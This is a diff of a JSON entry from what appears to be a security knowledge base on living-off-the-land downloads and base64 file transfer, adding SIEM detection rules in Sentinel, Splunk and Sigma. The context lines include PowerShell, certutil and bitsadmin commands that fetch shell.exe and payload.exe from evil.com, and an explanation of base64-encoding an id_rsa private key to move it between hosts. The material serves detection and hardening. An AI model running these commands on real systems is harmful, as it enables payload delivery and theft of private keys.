@@ -99,7 +99,64 @@
     ],
     "misconfiguration": "Target systems allow arbitrary file downloads via curl, wget, certutil, bitsadmin, or PowerShell Invoke-WebRequest without application allowlisting or egress filtering. Attackers use these native tools (LOLBins) to fetch payloads from attacker-controlled servers, bypassing endpoint protection that might detect known malicious tool names.",
     "vulnerable_config": "# Living-off-the-land file download methods (all built into Windows/Linux):\n# PowerShell (often bypasses older AV):\n(New-Object Net.WebClient).DownloadFile('http://evil.com/shell.exe', 'C:\\Temp\\shell.exe')\n\n# certutil (trusted Microsoft binary, often not blocked):\ncertutil -urlcache -split -f http://evil.com/payload.exe payload.exe\n\n# bitsadmin (background transfer service):\nbitsadmin /transfer myJob http://evil.com/shell.exe C:\\Temp\\shell.exe\n\n# All of these bypass controls that only look for 'nc.exe', 'mimikatz.exe', etc.",
-    "secure_config": "# Application allowlisting (most effective):\n# Windows Defender Application Control (WDAC) or AppLocker\n# Only signed, approved executables run\n# Blocks dropping and running arbitrary payloads even via LOLBins\n\n# PowerShell Constrained Language Mode + AMSI:\n# GPO: PowerShell Execution Policy = AllSigned\n# Blocks unsigned scripts; AMSI scans all scripts before execution\n\n# Egress filtering - block outbound to unknown IPs:\n# Web proxy with allowlist for legitimate update sources\n# Alert on: certutil with -urlcache flag (Event 4688 + command line audit)\n# Sysmon Rule: ProcessCreate where Image = certutil.exe and CommandLine contains 'urlcache'\n\n# Network IDS: alert on HTTP/HTTPS downloads initiated by certutil, bitsadmin process\n# Defender ATP: 'Suspicious process using Certutil to download content'"
+    "secure_config": "# Application allowlisting (most effective):\n# Windows Defender Application Control (WDAC) or AppLocker\n# Only signed, approved executables run\n# Blocks dropping and running arbitrary payloads even via LOLBins\n\n# PowerShell Constrained Language Mode + AMSI:\n# GPO: PowerShell Execution Policy = AllSigned\n# Blocks unsigned scripts; AMSI scans all scripts before execution\n\n# Egress filtering - block outbound to unknown IPs:\n# Web proxy with allowlist for legitimate update sources\n# Alert on: certutil with -urlcache flag (Event 4688 + command line audit)\n# Sysmon Rule: ProcessCreate where Image = certutil.exe and CommandLine contains 'urlcache'\n\n# Network IDS: alert on HTTP/HTTPS downloads initiated by certutil, bitsadmin process\n# Defender ATP: 'Suspicious process using Certutil to download content'",
+    "detections": [
+      {
+        "platform": "sentinel",
+        "name": "Base64 - Copy/Paste Transfer - Sentinel",
+        "logic": "DeviceProcessEvents\n| where ProcessCommandLine has_any (\"base64 -d\",\"FromBase64String\") or ProcessCommandLine has \"base64 --decode\"\n| project Timestamp, DeviceName, AccountName, ProcessCommandLine\n| sort by Timestamp desc\n// no network transfer; the long base64 blob in the command line is the signal",
+        "data_source": "defender-endpoint",
+        "attack": [
+          "T1105"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "medium"
+      },
+      {
+        "platform": "splunk",
+        "name": "Base64 - Copy/Paste Transfer (1) - Splunk",
+        "logic": "index=linux sourcetype=\"linux:auditd\" (proctitle=\"*base64*-d*\" OR proctitle=\"*base64 -d*\")\n| table _time, host, auid, proctitle",
+        "data_source": "linux-audit",
+        "attack": [
+          "T1105"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "medium"
+      },
+      {
+        "platform": "splunk",
+        "name": "Base64 - Copy/Paste Transfer (2) - Splunk",
+        "logic": "index=wineventlog EventCode=4104 ScriptBlockText=\"*FromBase64String*\"\n| table _time, Computer, User, ScriptBlockText",
+        "data_source": "powershell",
+        "attack": [
+          "T1105"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "medium",
+        "log_ids": [
+          "4104"
+        ]
+      },
+      {
+        "platform": "sigma",
+        "name": "proc_creation_base64_decode_pipe",
+        "logic": "proc_creation_base64_decode_pipe",
+        "data_source": "sysmon",
+        "attack": [
+          "T1105"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "medium"
+      }
+    ],
+    "visibility": {
+      "requires": [
+        "defender-endpoint",
+        "linux-audit",
+        "powershell",
+        "sysmon"
+      ]
+    }
   },
   "explain": "Encodes a file to text so you can carry it through a shell with no file transfer:\n  cat id_rsa    read the file bytes\n  base64 -w 0   encode to one unwrapped line (no newlines to break the paste)\n  echo          print a trailing newline so the blob is easy to select\nCopy the text to the other host and decode it back (base64 -d on Linux, [Convert]::FromBase64String on Windows); md5sum both ends to prove nothing was truncated."
 }
